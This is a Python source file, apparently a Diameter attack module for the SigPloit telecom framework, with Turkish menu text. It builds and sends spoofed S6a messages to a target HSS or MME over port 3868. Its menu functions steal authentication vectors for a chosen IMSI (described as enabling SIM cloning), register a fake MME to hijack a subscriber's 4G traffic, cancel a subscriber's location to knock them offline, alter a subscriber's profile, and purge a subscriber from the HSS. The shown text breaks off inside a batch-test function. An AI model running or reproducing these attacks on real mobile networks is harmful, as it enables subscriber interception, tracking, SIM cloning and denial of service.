#!/usr/bin/env python
"""
Diameter Protocol Attack Module for SigPloit
Implements full Diameter message crafting for 4G/LTE security testing.

Diameter uses TCP/SCTP on port 3868 (default).
Supports S6a interface (HSS-MME) attacks.
"""
import sys
import os
import struct
import time
import socket
import random
import datetime

# Diameter Command Codes
DIAMETER_CER = 257   # Capabilities-Exchange-Request
DIAMETER_CEA = 257   # Capabilities-Exchange-Answer
DIAMETER_DWR = 280   # Device-Watchdog-Request
DIAMETER_DWA = 280   # Device-Watchdog-Answer
DIAMETER_ULR = 316   # Update-Location-Request (3GPP S6a)
DIAMETER_ULA = 316   # Update-Location-Answer
DIAMETER_AIR = 318   # Authentication-Information-Request (3GPP S6a)
DIAMETER_AIA = 318   # Authentication-Information-Answer
DIAMETER_NOR = 323   # Notify-Request
DIAMETER_PUR = 321   # Purge-UE-Request
DIAMETER_IDR = 319   # Insert-Subscriber-Data-Request
DIAMETER_CLR = 317   # Cancel-Location-Request

# Diameter AVP Codes
AVP_SESSION_ID = 263
AVP_ORIGIN_HOST = 264
AVP_ORIGIN_REALM = 296
AVP_DESTINATION_HOST = 293
AVP_DESTINATION_REALM = 283
AVP_AUTH_SESSION_STATE = 277
AVP_VENDOR_SPECIFIC_APP_ID = 260
AVP_RESULT_CODE = 268
AVP_USER_NAME = 1          # IMSI
AVP_VISITED_PLMN_ID = 1407  # 3GPP
AVP_EXPERIMENTAL_RESULT = 297
AVP_EXPERIMENTAL_RESULT_CODE = 298

# 3GPP Vendor ID
VENDOR_3GPP = 10415

# Diameter Result Codes
RESULT_CODES = {
    2001: ("DIAMETER_SUCCESS", "Basarili"),
    2002: ("DIAMETER_LIMITED_SUCCESS", "Kismi basari"),
    3001: ("DIAMETER_COMMAND_UNSUPPORTED", "Komut desteklenmiyor"),
    3002: ("DIAMETER_UNABLE_TO_DELIVER", "Iletilemedi"),
    3003: ("DIAMETER_REALM_NOT_SERVED", "Realm desteklenmiyor"),
    3004: ("DIAMETER_TOO_BUSY", "Sunucu mesgul"),
    3005: ("DIAMETER_LOOP_DETECTED", "Dongu tespit edildi"),
    3006: ("DIAMETER_REDIRECT_INDICATION", "Yonlendirme"),
    3007: ("DIAMETER_APPLICATION_UNSUPPORTED", "Uygulama desteklenmiyor"),
    3008: ("DIAMETER_INVALID_HDR_BITS", "Gecersiz header bit"),
    3009: ("DIAMETER_INVALID_AVP_BITS", "Gecersiz AVP bit"),
    3010: ("DIAMETER_UNKNOWN_PEER", "Bilinmeyen peer"),
    4001: ("DIAMETER_AUTHENTICATION_REJECTED", "Kimlik dogrulama reddedildi"),
    4181: ("DIAMETER_AUTHENTICATION_DATA_UNAVAILABLE", "Auth verisi yok"),
    5001: ("DIAMETER_AVP_UNSUPPORTED", "AVP desteklenmiyor"),
    5002: ("DIAMETER_UNKNOWN_SESSION_ID", "Bilinmeyen oturum"),
    5003: ("DIAMETER_AUTHORIZATION_REJECTED", "Yetkilendirme reddedildi"),
    5004: ("DIAMETER_INVALID_AVP_VALUE", "Gecersiz AVP degeri"),
    5005: ("DIAMETER_MISSING_AVP", "Eksik AVP"),
    5006: ("DIAMETER_RESOURCES_EXCEEDED", "Kaynak asimi"),
    5007: ("DIAMETER_CONTRADICTING_AVPS", "Celisen AVP'ler"),
    5008: ("DIAMETER_AVP_NOT_ALLOWED", "AVP izin verilmiyor"),
    5009: ("DIAMETER_AVP_OCCURS_TOO_MANY_TIMES", "AVP cok fazla tekrar"),
    5012: ("DIAMETER_UNABLE_TO_COMPLY", "Uyum saglanamadi"),
    5420: ("DIAMETER_ERROR_USER_UNKNOWN", "Bilinmeyen kullanici"),
    5421: ("DIAMETER_ERROR_IDENTITIES_DONT_MATCH", "Kimlik uyusmazligi"),
    5422: ("DIAMETER_ERROR_IDENTITY_NOT_REGISTERED", "Kimlik kayitli degil"),
    5423: ("DIAMETER_ERROR_ROAMING_NOT_ALLOWED", "Roaming izni yok"),
}


def build_diameter_header(cmd_code, app_id=16777251, hop_by_hop=None, end_to_end=None, request=True):
    """Build Diameter message header (20 bytes)."""
    version = 1
    flags = 0x80 if request else 0x00  # R bit
    flags |= 0x40  # P bit (proxiable)

    if hop_by_hop is None:
        hop_by_hop = random.randint(1, 0xFFFFFFFF)
    if end_to_end is None:
        end_to_end = random.randint(1, 0xFFFFFFFF)

    header = struct.pack("!B", version)
    header += b'\x00\x00\x00'  # Length placeholder
    header += struct.pack("!B", flags)
    header += struct.pack("!I", cmd_code)[1:]  # 3 bytes
    header += struct.pack("!I", app_id)
    header += struct.pack("!I", hop_by_hop)
    header += struct.pack("!I", end_to_end)

    return header


def build_avp(code, data, vendor_id=None, mandatory=True):
    """Build a Diameter AVP (Attribute-Value Pair)."""
    flags = 0x40 if mandatory else 0x00  # M bit
    if vendor_id is not None:
        flags |= 0x80  # V bit

    if isinstance(data, str):
        data = data.encode('utf-8')

    avp_len = 8 + len(data)
    if vendor_id is not None:
        avp_len += 4

    avp = struct.pack("!I", code)
    avp += struct.pack("!B", flags)
    avp += struct.pack("!I", avp_len)[1:]  # 3 bytes

    if vendor_id is not None:
        avp += struct.pack("!I", vendor_id)

    avp += data

    # Pad to 4-byte boundary
    padding = (4 - (len(avp) % 4)) % 4
    avp += b'\x00' * padding

    return avp


def finalize_message(header, avps):
    """Combine header + AVPs and fix length field."""
    msg = header + avps
    msg_len = len(msg)
    msg = msg[0:1] + struct.pack("!I", msg_len)[1:] + msg[4:]
    return msg


def build_cer(origin_host, origin_realm):
    """Build Capabilities-Exchange-Request."""
    avps = b''
    avps += build_avp(AVP_ORIGIN_HOST, origin_host)
    avps += build_avp(AVP_ORIGIN_REALM, origin_realm)

    # Host-IP-Address AVP (type Address, IPv4)
    ip_data = struct.pack("!H", 1) + socket.inet_aton("127.0.0.1")
    avps += build_avp(257, ip_data)

    # Vendor-Id
    avps += build_avp(266, struct.pack("!I", 0))

    # Product-Name
    avps += build_avp(269, "SigPloit")

    # Vendor-Specific-Application-Id (3GPP S6a)
    vendor_app_inner = build_avp(266, struct.pack("!I", VENDOR_3GPP))
    vendor_app_inner += build_avp(258, struct.pack("!I", 16777251))  # Auth-Application-Id
    avps += build_avp(AVP_VENDOR_SPECIFIC_APP_ID, vendor_app_inner)

    # Auth-Application-Id
    avps += build_avp(258, struct.pack("!I", 16777251))

    header = build_diameter_header(DIAMETER_CER, app_id=0)
    return finalize_message(header, avps)


def build_air(imsi, origin_host, origin_realm, dest_host, dest_realm, visited_plmn):
    """Build Authentication-Information-Request (S6a)."""
    avps = b''
    avps += build_avp(AVP_SESSION_ID, f"{origin_host};{random.randint(1000,9999)};{random.randint(1000,9999)}")
    avps += build_avp(AVP_ORIGIN_HOST, origin_host)
    avps += build_avp(AVP_ORIGIN_REALM, origin_realm)
    avps += build_avp(AVP_DESTINATION_HOST, dest_host)
    avps += build_avp(AVP_DESTINATION_REALM, dest_realm)
    avps += build_avp(AVP_USER_NAME, imsi)
    avps += build_avp(AVP_VISITED_PLMN_ID, visited_plmn, vendor_id=VENDOR_3GPP)
    avps += build_avp(AVP_AUTH_SESSION_STATE, struct.pack("!I", 1))

    # Requested-EUTRAN-Authentication-Info (grouped AVP)
    eutran_inner = build_avp(1410, struct.pack("!I", 1), vendor_id=VENDOR_3GPP)  # Number-Of-Requested-Vectors
    eutran_inner += build_avp(1411, struct.pack("!I", 0), vendor_id=VENDOR_3GPP)  # Immediate-Response-Preferred
    avps += build_avp(1408, eutran_inner, vendor_id=VENDOR_3GPP)

    header = build_diameter_header(DIAMETER_AIR, app_id=16777251)
    return finalize_message(header, avps)


def build_ulr(imsi, origin_host, origin_realm, dest_host, dest_realm, visited_plmn):
    """Build Update-Location-Request (S6a)."""
    avps = b''
    avps += build_avp(AVP_SESSION_ID, f"{origin_host};{random.randint(1000,9999)};{random.randint(1000,9999)}")
    avps += build_avp(AVP_ORIGIN_HOST, origin_host)
    avps += build_avp(AVP_ORIGIN_REALM, origin_realm)
    avps += build_avp(AVP_DESTINATION_HOST, dest_host)
    avps += build_avp(AVP_DESTINATION_REALM, dest_realm)
    avps += build_avp(AVP_USER_NAME, imsi)
    avps += build_avp(AVP_VISITED_PLMN_ID, visited_plmn, vendor_id=VENDOR_3GPP)
    avps += build_avp(AVP_AUTH_SESSION_STATE, struct.pack("!I", 1))

    # ULR-Flags (S6a/S6d + Initial-Attach)
    ulr_flags = struct.pack("!I", 0x06)
    avps += build_avp(1405, ulr_flags, vendor_id=VENDOR_3GPP)

    # RAT-Type (EUTRAN = 1004)
    avps += build_avp(1032, struct.pack("!I", 1004), vendor_id=VENDOR_3GPP)

    header = build_diameter_header(DIAMETER_ULR, app_id=16777251)
    return finalize_message(header, avps)


def build_clr(imsi, origin_host, origin_realm, dest_host=None, dest_realm=None, cancel_type=0):
    """Build Cancel-Location-Request (S6a)."""
    avps = b''
    avps += build_avp(AVP_SESSION_ID, f"{origin_host};clr;{random.randint(1000,9999)}")
    avps += build_avp(AVP_ORIGIN_HOST, origin_host)
    avps += build_avp(AVP_ORIGIN_REALM, origin_realm)
    if dest_host:
        avps += build_avp(AVP_DESTINATION_HOST, dest_host)
    if dest_realm:
        avps += build_avp(AVP_DESTINATION_REALM, dest_realm)
    avps += build_avp(AVP_USER_NAME, imsi)
    avps += build_avp(AVP_AUTH_SESSION_STATE, struct.pack("!I", 1))
    # Cancellation-Type: 0=MME_UPDATE, 1=SGSN_UPDATE, 2=SUBSCRIPTION_WITHDRAWAL, 3=UPDATE_PROCEDURE_IWF, 4=INITIAL_ATTACH_PROCEDURE
    avps += build_avp(1420, struct.pack("!I", cancel_type), vendor_id=VENDOR_3GPP)

    header = build_diameter_header(DIAMETER_CLR, app_id=16777251)
    return finalize_message(header, avps)


def build_idr(imsi, origin_host, origin_realm, dest_host=None, dest_realm=None):
    """Build Insert-Subscriber-Data-Request (S6a)."""
    avps = b''
    avps += build_avp(AVP_SESSION_ID, f"{origin_host};idr;{random.randint(1000,9999)}")
    avps += build_avp(AVP_ORIGIN_HOST, origin_host)
    avps += build_avp(AVP_ORIGIN_REALM, origin_realm)
    if dest_host:
        avps += build_avp(AVP_DESTINATION_HOST, dest_host)
    if dest_realm:
        avps += build_avp(AVP_DESTINATION_REALM, dest_realm)
    avps += build_avp(AVP_USER_NAME, imsi)
    avps += build_avp(AVP_AUTH_SESSION_STATE, struct.pack("!I", 1))
    # IDR-Flags
    avps += build_avp(1490, struct.pack("!I", 0x01), vendor_id=VENDOR_3GPP)

    # Subscription-Data (grouped) - minimal
    sub_data_inner = b''
    # MSISDN (example - could be parameterized)
    sub_data_inner += build_avp(701, b'\x09\x05\x05\x36\x40\x34\x24', vendor_id=VENDOR_3GPP)
    # Access-Restriction-Data (no restriction)
    sub_data_inner += build_avp(1426, struct.pack("!I", 0), vendor_id=VENDOR_3GPP)
    avps += build_avp(1400, sub_data_inner, vendor_id=VENDOR_3GPP)

    header = build_diameter_header(DIAMETER_IDR, app_id=16777251)
    return finalize_message(header, avps)


def build_pur(imsi, origin_host, origin_realm, dest_host, dest_realm):
    """Build Purge-UE-Request (S6a) - Remove subscriber from HSS."""
    avps = b''
    avps += build_avp(AVP_SESSION_ID, f"{origin_host};pur;{random.randint(1000,9999)}")
    avps += build_avp(AVP_ORIGIN_HOST, origin_host)
    avps += build_avp(AVP_ORIGIN_REALM, origin_realm)
    avps += build_avp(AVP_DESTINATION_HOST, dest_host)
    avps += build_avp(AVP_DESTINATION_REALM, dest_realm)
    avps += build_avp(AVP_USER_NAME, imsi)
    avps += build_avp(AVP_AUTH_SESSION_STATE, struct.pack("!I", 1))
    # PUR-Flags
    avps += build_avp(1508, struct.pack("!I", 0x01), vendor_id=VENDOR_3GPP)

    header = build_diameter_header(DIAMETER_PUR, app_id=16777251)
    return finalize_message(header, avps)


def build_nor(imsi, origin_host, origin_realm, dest_host, dest_realm):
    """Build Notify-Request (S6a) - Send notification to HSS."""
    avps = b''
    avps += build_avp(AVP_SESSION_ID, f"{origin_host};nor;{random.randint(1000,9999)}")
    avps += build_avp(AVP_ORIGIN_HOST, origin_host)
    avps += build_avp(AVP_ORIGIN_REALM, origin_realm)
    avps += build_avp(AVP_DESTINATION_HOST, dest_host)
    avps += build_avp(AVP_DESTINATION_REALM, dest_realm)
    avps += build_avp(AVP_USER_NAME, imsi)
    avps += build_avp(AVP_AUTH_SESSION_STATE, struct.pack("!I", 1))

    # NOR-Flags: Single-Registration-Indication
    avps += build_avp(1443, struct.pack("!I", 0x01), vendor_id=VENDOR_3GPP)

    header = build_diameter_header(DIAMETER_NOR, app_id=16777251)
    return finalize_message(header, avps)


def build_dwr(origin_host, origin_realm):
    """Build Device-Watchdog-Request - keep connection alive."""
    avps = b''
    avps += build_avp(AVP_ORIGIN_HOST, origin_host)
    avps += build_avp(AVP_ORIGIN_REALM, origin_realm)

    header = build_diameter_header(DIAMETER_DWR, app_id=0)
    return finalize_message(header, avps)


# ============================================
# RESPONSE PARSING
# ============================================

def parse_diameter_response(data):
    """Parse a Diameter response message and extract key information."""
    result = {
        'version': 0,
        'length': 0,
        'flags': 0,
        'cmd_code': 0,
        'app_id': 0,
        'hop_by_hop': 0,
        'end_to_end': 0,
        'result_code': 0,
        'result_text': '',
        'avps': [],
        'origin_host': '',
        'origin_realm': '',
        'error_message': '',
        'raw_hex': '',
        'is_request': False,
        'is_error': False,
    }

    if not data or len(data) < 20:
        return result

    result['raw_hex'] = data[:80].hex()

    # Parse header
    result['version'] = data[0]
    result['length'] = struct.unpack("!I", b'\x00' + data[1:4])[0]
    result['flags'] = data[4]
    result['cmd_code'] = struct.unpack("!I", b'\x00' + data[5:8])[0]
    result['app_id'] = struct.unpack("!I", data[8:12])[0]
    result['hop_by_hop'] = struct.unpack("!I", data[12:16])[0]
    result['end_to_end'] = struct.unpack("!I", data[16:20])[0]
    result['is_request'] = bool(result['flags'] & 0x80)
    result['is_error'] = bool(result['flags'] & 0x20)

    # Parse AVPs
    offset = 20
    while offset + 8 <= len(data) and offset < result['length']:
        try:
            avp_code = struct.unpack("!I", data[offset:offset+4])[0]
            avp_flags = data[offset+4]
            avp_len = struct.unpack("!I", b'\x00' + data[offset+5:offset+8])[0]

            has_vendor = bool(avp_flags & 0x80)
            vendor_id = 0
            data_start = offset + 8
            if has_vendor:
                vendor_id = struct.unpack("!I", data[offset+8:offset+12])[0]
                data_start = offset + 12

            data_len = avp_len - (12 if has_vendor else 8)
            if data_len < 0:
                break
            avp_data = data[data_start:data_start + data_len]

            avp_info = {
                'code': avp_code,
                'flags': avp_flags,
                'vendor_id': vendor_id,
                'data': avp_data,
            }
            result['avps'].append(avp_info)

            # Extract specific AVPs
            if avp_code == AVP_RESULT_CODE and len(avp_data) >= 4:
                result['result_code'] = struct.unpack("!I", avp_data[:4])[0]
            elif avp_code == AVP_EXPERIMENTAL_RESULT:
                # Grouped AVP - parse inner
                inner_offset = 0
                while inner_offset + 8 <= len(avp_data):
                    inner_code = struct.unpack("!I", avp_data[inner_offset:inner_offset+4])[0]
                    inner_flags = avp_data[inner_offset+4]
                    inner_len = struct.unpack("!I", b'\x00' + avp_data[inner_offset+5:inner_offset+8])[0]
                    inner_has_v = bool(inner_flags & 0x80)
                    inner_data_start = inner_offset + (12 if inner_has_v else 8)
                    inner_data_len = inner_len - (12 if inner_has_v else 8)
                    if inner_data_len > 0 and inner_code == AVP_EXPERIMENTAL_RESULT_CODE:
                        inner_d = avp_data[inner_data_start:inner_data_start+inner_data_len]
                        if len(inner_d) >= 4:
                            result['result_code'] = struct.unpack("!I", inner_d[:4])[0]
                    padded_len = inner_len + ((4 - (inner_len % 4)) % 4)
                    inner_offset += padded_len
            elif avp_code == AVP_ORIGIN_HOST:
                result['origin_host'] = avp_data.decode('utf-8', errors='ignore')
            elif avp_code == AVP_ORIGIN_REALM:
                result['origin_realm'] = avp_data.decode('utf-8', errors='ignore')
            elif avp_code == 281:  # Error-Message
                result['error_message'] = avp_data.decode('utf-8', errors='ignore')

            # Advance to next AVP (padded to 4 bytes)
            padded = avp_len + ((4 - (avp_len % 4)) % 4)
            offset += padded
        except Exception:
            break

    # Lookup result code text
    if result['result_code'] in RESULT_CODES:
        name, desc = RESULT_CODES[result['result_code']]
        result['result_text'] = f"{name} - {desc}"
    elif result['result_code'] > 0:
        result['result_text'] = f"Bilinmeyen kod: {result['result_code']}"

    return result


def print_response_analysis(parsed):
    """Print a detailed analysis of a parsed Diameter response."""
    print("\n" + "-" * 50)
    print(" Diameter Yanit Analizi")
    print("-" * 50)
    print(f"  Versiyon: {parsed['version']}")
    print(f"  Mesaj Boyutu: {parsed['length']} byte")
    print(f"  Komut Kodu: {parsed['cmd_code']}")
    print(f"  Application-ID: {parsed['app_id']}")

    cmd_names = {257: "CEA", 316: "ULA", 317: "CLA", 318: "AIA", 319: "IDA", 321: "PUA", 323: "NOA"}
    cmd_name = cmd_names.get(parsed['cmd_code'], "?")
    print(f"  Mesaj Tipi: {cmd_name} ({'Request' if parsed['is_request'] else 'Answer'})")

    if parsed['is_error']:
        print("  \033[31m[!] ERROR flag set!\033[0m")

    if parsed['result_code']:
        rc = parsed['result_code']
        if rc >= 2000 and rc < 3000:
            color = "\033[32m"  # green
        elif rc >= 3000 and rc < 4000:
            color = "\033[33m"  # yellow
        else:
            color = "\033[31m"  # red
        print(f"  Result-Code: {color}{rc} - {parsed['result_text']}\033[0m")

    if parsed['origin_host']:
        print(f"  Origin-Host: {parsed['origin_host']}")
    if parsed['origin_realm']:
        print(f"  Origin-Realm: {parsed['origin_realm']}")
    if parsed['error_message']:
        print(f"  Error-Message: {parsed['error_message']}")

    print(f"  AVP Sayisi: {len(parsed['avps'])}")

    # Vulnerability assessment
    if parsed['result_code'] == 2001:
        print("\n  \033[32m[+] ZAFIYET: Istek basariyla islendi! Hedef koruma yok.\033[0m")
    elif parsed['result_code'] in [5001, 5003, 5005]:
        print("\n  \033[33m[*] Guvenlik duvar aktif - istek reddedildi.\033[0m")
    elif parsed['result_code'] in [3001, 3007]:
        print("\n  \033[33m[*] Komut/uygulama desteklenmiyor.\033[0m")
    elif parsed['result_code'] == 5420:
        print("\n  \033[33m[*] Kullanici bulunamadi (IMSI gecersiz?).\033[0m")

    print("-" * 50)


def get_input(prompt, default=None):
    """Get user input with optional default."""
    if default:
        data = input(f"{prompt} [{default}]: ")
        return data if data else default
    return input(f"{prompt}: ")


def _send_diameter(remote_ip, remote_port, origin_host, origin_realm, message, msg_name=""):
    """Common function to send a Diameter message with CER handshake."""
    sock = None
    response_parsed = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)

        print(f"\n[+] {remote_ip}:{remote_port} adresine TCP baglantisi kuruluyor...")
        sock.connect((remote_ip, remote_port))
        print("[+] TCP baglandi!")

        # CER/CEA handshake
        cer = build_cer(origin_host, origin_realm)
        sock.send(cer)
        print("[+] CER gonderildi, CEA bekleniyor...")

        cea_data = sock.recv(4096)
        if not cea_data:
            print("[-] CEA yaniti alinamadi.")
            return None

        cea_parsed = parse_diameter_response(cea_data)
        print(f"[+] CEA alindi! ({len(cea_data)} byte)")
        if cea_parsed['origin_host']:
            print(f"[+] Hedef: {cea_parsed['origin_host']} ({cea_parsed['origin_realm']})")
        if cea_parsed['result_code']:
            rc = cea_parsed['result_code']
            print(f"[+] CEA Result: {rc} - {cea_parsed['result_text']}")
            if rc != 2001:
                print("[-] CER reddedildi.")
                return cea_parsed

        # Send actual message
        sock.send(message)
        print(f"[+] {msg_name} gonderildi, yanit bekleniyor...")

        response = sock.recv(8192)
        if response:
            response_parsed = parse_diameter_response(response)
            print(f"[+] Yanit alindi! ({len(response)} byte)")
            print_response_analysis(response_parsed)

            # Log to file
            _log_result(remote_ip, remote_port, msg_name, response_parsed)
        else:
            print("[-] Yanit alinamadi.")

    except ConnectionRefusedError:
        print("[-] Baglanti reddedildi. Port kapali.")
    except socket.timeout:
        print("[-] Zaman asimi. Hedef erisilemiyor veya filtreleniyor.")
    except Exception as e:
        print(f"[-] Hata: {e}")
    finally:
        if sock:
            try:
                sock.close()
            except Exception:
                pass

    return response_parsed


def _log_result(ip, port, attack_type, parsed):
    """Log attack result to file."""
    try:
        ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        rc = parsed.get('result_code', 0)
        origin = parsed.get('origin_host', 'N/A')
        with open("diameter_results.txt", "a", encoding="utf-8") as f:
            f.write(f"[{ts}] {attack_type} -> {ip}:{port} | RC={rc} | Origin={origin}\n")
    except Exception:
        pass


# ============================================
# ATTACK FUNCTIONS
# ============================================

def _cer_attack():
    """CER - Diameter baglanti testi."""
    print("\n" + "=" * 50)
    print(" Diameter CER - Baglanti Testi")
    print("=" * 50 + "\n")

    remote_ip = get_input("Hedef HSS/DRA IP", "10.0.0.1")
    remote_port = int(get_input("Hedef Port", "3868"))
    origin_host = get_input("Origin-Host (Kimliginiz)", "mme.test.com")
    origin_realm = get_input("Origin-Realm", "test.com")

    print("\n[+] CER mesaji hazirlaniyor...")
    cer = build_cer(origin_host, origin_realm)
    print(f"[+] CER Boyutu: {len(cer)} byte")

    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((remote_ip, remote_port))
        print("[+] TCP baglandi!")

        sock.send(cer)
        print("[+] CER gonderildi, CEA bekleniyor...")

        response = sock.recv(4096)
        if response:
            parsed = parse_diameter_response(response)
            print(f"\n[+] CEA alindi! ({len(response)} byte)")
            print_response_analysis(parsed)

            if parsed['result_code'] == 2001:
                print("\n\033[32m[+] Diameter nodu AKTIF ve baglanti kabul ediyor!\033[0m")
                print("[+] Bu nod uzerinde diger saldirilari deneyebilirsiniz.")
        else:
            print("[-] Yanit yok.")
    except ConnectionRefusedError:
        print("[-] Baglanti reddedildi.")
    except socket.timeout:
        print("[-] Zaman asimi.")
    except Exception as e:
        print(f"[-] Hata: {e}")
    finally:
        if sock:
            try:
                sock.close()
            except Exception:
                pass

    input("\nDevam etmek icin Enter'a basin...")
    diameter_menu()


def _air_attack():
    """AIR - Auth vektoru cekme."""
    print("\n" + "=" * 50)
    print(" Diameter AIR - Auth Bilgi Istegi")
    print(" HSS'den Kimlik Dogrulama Vektorlerini Cekme")
    print("=" * 50 + "\n")

    remote_ip = get_input("Hedef HSS IP", "10.0.0.1")
    remote_port = int(get_input("Hedef Port", "3868"))
    origin_host = get_input("Origin-Host (Sahte MME)", "mme.attacker.com")
    origin_realm = get_input("Origin-Realm", "attacker.com")
    dest_host = get_input("Destination-Host (HSS)", "hss.target.com")
    dest_realm = get_input("Destination-Realm", "target.com")
    imsi = get_input("Hedef IMSI", "286011234567890")
    visited_plmn = get_input("Visited-PLMN-ID (hex)", "28601")

    plmn_bytes = bytes.fromhex(visited_plmn.ljust(6, '0')[:6])

    air = build_air(imsi, origin_host, origin_realm, dest_host, dest_realm, plmn_bytes)
    print(f"[+] AIR Boyutu: {len(air)} byte | IMSI: {imsi}")

    result = _send_diameter(remote_ip, remote_port, origin_host, origin_realm, air, "AIR")

    if result and result.get('result_code') == 2001:
        print("\n\033[31m[!!!] KRITIK ZAFIYET: Auth vektorleri elde edildi!\033[0m")
        print("[+] RAND, AUTN, XRES, KASME degerleri yanitda olabilir.")
        print("[+] Bu vektorler ile SIM klonlama mumkun olabilir.")

    input("\nDevam etmek icin Enter'a basin...")
    diameter_menu()


def _ulr_attack():
    """ULR - Abone lokasyon guncelleme."""
    print("\n" + "=" * 50)
    print(" Diameter ULR - Lokasyon Guncelleme")
    print(" Sahte MME Kaydederek Aboneyi Ele Gecirme")
    print("=" * 50 + "\n")
    print("\033[33m[!] UYARI: Bu saldiri 4G trafikini sizin MME'nize yonlendirir!\033[0m\n")

    remote_ip = get_input("Hedef HSS IP", "10.0.0.1")
    remote_port = int(get_input("Hedef Port", "3868"))
    origin_host = get_input("Origin-Host (Sahte MME)", "mme.evil.com")
    origin_realm = get_input("Origin-Realm", "evil.com")
    dest_host = get_input("Destination-Host (HSS)", "hss.target.com")
    dest_realm = get_input("Destination-Realm", "target.com")
    imsi = get_input("Hedef IMSI", "286011234567890")
    visited_plmn = get_input("Visited-PLMN-ID (hex)", "28601")

    plmn_bytes = bytes.fromhex(visited_plmn.ljust(6, '0')[:6])

    ulr = build_ulr(imsi, origin_host, origin_realm, dest_host, dest_realm, plmn_bytes)
    print(f"[+] ULR Boyutu: {len(ulr)} byte")

    result = _send_diameter(remote_ip, remote_port, origin_host, origin_realm, ulr, "ULR")

    if result and result.get('result_code') == 2001:
        print("\n\033[31m[!!!] KRITIK ZAFIYET: Lokasyon guncellendi!\033[0m")
        print("[+] Abone artik sahte MME'nize kayitli olabilir.")

    input("\nDevam etmek icin Enter'a basin...")
    diameter_menu()


def _clr_attack():
    """CLR - Abone baglanti kesme (DoS)."""
    print("\n" + "=" * 50)
    print(" Diameter CLR - Lokasyon Iptali")
    print(" Aboneyi 4G Sebekesinden Dusurme (DoS)")
    print("=" * 50 + "\n")
    print("\033[31m[!] UYARI: Bu saldiri hedefi 4G sebekesinden dusurur!\033[0m\n")

    remote_ip = get_input("Hedef MME IP", "10.0.0.1")
    remote_port = int(get_input("Hedef Port", "3868"))
    origin_host = get_input("Origin-Host (Sahte HSS)", "hss.evil.com")
    origin_realm = get_input("Origin-Realm", "evil.com")
    dest_host = get_input("Destination-Host (MME)", "")
    dest_realm = get_input("Destination-Realm", "")
    imsi = get_input("Hedef IMSI", "286011234567890")

    print("\nIptal Turu:")
    print("  0) MME_UPDATE_PROCEDURE")
    print("  1) SGSN_UPDATE")
    print("  2) SUBSCRIPTION_WITHDRAWAL")
    print("  3) UPDATE_PROCEDURE_IWF")
    print("  4) INITIAL_ATTACH_PROCEDURE")
    cancel_type = int(get_input("Iptal Turu", "2"))

    clr = build_clr(imsi, origin_host, origin_realm,
                     dest_host if dest_host else None,
                     dest_realm if dest_realm else None,
                     cancel_type)
    print(f"[+] CLR Boyutu: {len(clr)} byte")

    result = _send_diameter(remote_ip, remote_port, origin_host, origin_realm, clr, "CLR")

    if result and result.get('result_code') == 2001:
        print("\n\033[31m[!!!] ZAFIYET: Abone lokasyonu iptal edildi!\033[0m")
        print("[+] Hedef 4G sebekesinden dusmis olabilir.")

    input("\nDevam etmek icin Enter'a basin...")
    diameter_menu()


def _idr_attack():
    """IDR - Abone profili degistirme."""
    print("\n" + "=" * 50)
    print(" Diameter IDR - Abone Verisi Ekleme")
    print(" MME'deki Abone Profilini Degistirme")
    print("=" * 50 + "\n")

    remote_ip = get_input("Hedef MME IP", "10.0.0.1")
    remote_port = int(get_input("Hedef Port", "3868"))
    origin_host = get_input("Origin-Host (Sahte HSS)", "hss.evil.com")
    origin_realm = get_input("Origin-Realm", "evil.com")
    dest_host = get_input("Destination-Host (MME)", "")
    dest_realm = get_input("Destination-Realm", "")
    imsi = get_input("Hedef IMSI", "286011234567890")

    idr = build_idr(imsi, origin_host, origin_realm,
                     dest_host if dest_host else None,
                     dest_realm if dest_realm else None)
    print(f"[+] IDR Boyutu: {len(idr)} byte")

    result = _send_diameter(remote_ip, remote_port, origin_host, origin_realm, idr, "IDR")

    if result and result.get('result_code') == 2001:
        print("\n\033[31m[!!!] ZAFIYET: Abone profili degistirildi!\033[0m")

    input("\nDevam etmek icin Enter'a basin...")
    diameter_menu()


def _pur_attack():
    """PUR - Abone silme (HSS'den temizleme)."""
    print("\n" + "=" * 50)
    print(" Diameter PUR - Abone Temizleme")
    print(" HSS'den Abone Kaydini Silme")
    print("=" * 50 + "\n")
    print("\033[31m[!] UYARI: Bu saldiri aboneyi HSS'den siler!\033[0m\n")

    remote_ip = get_input("Hedef HSS IP", "10.0.0.1")
    remote_port = int(get_input("Hedef Port", "3868"))
    origin_host = get_input("Origin-Host (Sahte MME)", "mme.evil.com")
    origin_realm = get_input("Origin-Realm", "evil.com")
    dest_host = get_input("Destination-Host (HSS)", "hss.target.com")
    dest_realm = get_input("Destination-Realm", "target.com")
    imsi = get_input("Hedef IMSI", "286011234567890")

    pur = build_pur(imsi, origin_host, origin_realm, dest_host, dest_realm)
    print(f"[+] PUR Boyutu: {len(pur)} byte")

    result = _send_diameter(remote_ip, remote_port, origin_host, origin_realm, pur, "PUR")

    if result and result.get('result_code') == 2001:
        print("\n\033[31m[!!!] ZAFIYET: Abone HSS'den silindi!\033[0m")

    input("\nDevam etmek icin Enter'a basin...")
    diameter_menu()


def _nor_attack():
    """NOR - HSS'ye bildirim gonderme."""
    print("\n" + "=" * 50)
    print(" Diameter NOR - Bildirim Istegi")
    print(" HSS'ye Sahte Bildirim Gonderme")
    print("=" * 50 + "\n")

    remote_ip = get_input("Hedef HSS IP", "10.0.0.1")
    remote_port = int(get_input("Hedef Port", "3868"))
    origin_host = get_input("Origin-Host (Sahte MME)", "mme.evil.com")
    origin_realm = get_input("Origin-Realm", "evil.com")
    dest_host = get_input("Destination-Host (HSS)", "hss.target.com")
    dest_realm = get_input("Destination-Realm", "target.com")
    imsi = get_input("Hedef IMSI", "286011234567890")

    nor = build_nor(imsi, origin_host, origin_realm, dest_host, dest_realm)
    print(f"[+] NOR Boyutu: {len(nor)} byte")

    result = _send_diameter(remote_ip, remote_port, origin_host, origin_realm, nor, "NOR")

    if result and result.get('result_code') == 2001:
        print("\n\033[33m[+] Bildirim kabul edildi.\033[0m")

    input("\nDevam etmek icin Enter'a basin...")
    diameter_menu()


def _batch_test():
    """Toplu test - Tum saldiri turlerini tek hedefte dene."""
    print("\n" + "=" * 50)
    print(" Diameter Toplu Test")
    print(" Tum saldiri turlerini tek hedefte deneme")
    print("=" * 50 + "\n")

    remote_ip = get_input("Hedef IP", "10.0.0.1")
    remote_port = int(get_input("Hedef Port", "3868"))
    origin_host = get_input("Origin-Host", "mme.test.com")
